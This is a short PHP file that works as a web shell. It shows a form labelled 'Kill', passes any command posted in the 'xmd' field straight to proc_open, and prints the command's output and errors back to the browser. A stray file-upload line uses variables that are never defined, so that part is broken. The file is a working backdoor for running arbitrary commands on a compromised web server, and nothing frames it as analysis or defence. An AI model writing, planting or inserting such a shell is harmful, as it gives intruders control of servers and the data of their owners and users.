<?php
echo '<form method="post">
<input type="text" name="xmd" size="30">
<input type="submit" value="Kill">
</form>';
if(move_uploaded_file($filetmp,$filename)=='1'){
echo '[OK] ===> '.$filename;
}
if(isset($_POST['xmd'])){
$xmd=$_POST['xmd'];
$descriptors = [
  0 => ['pipe', 'r'], // stdin
  1 => ['pipe', 'w'], // stdout
  2 => ['pipe', 'w'], // stderr
];

$process = proc_open($xmd, $descriptors, $pipes);

$output = stream_get_contents($pipes[1]);
$error = stream_get_contents($pipes[2]);

fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

echo "<textarea  cols=30 rows=15;>$output";
echo "Error:\n$error\n";
}
?>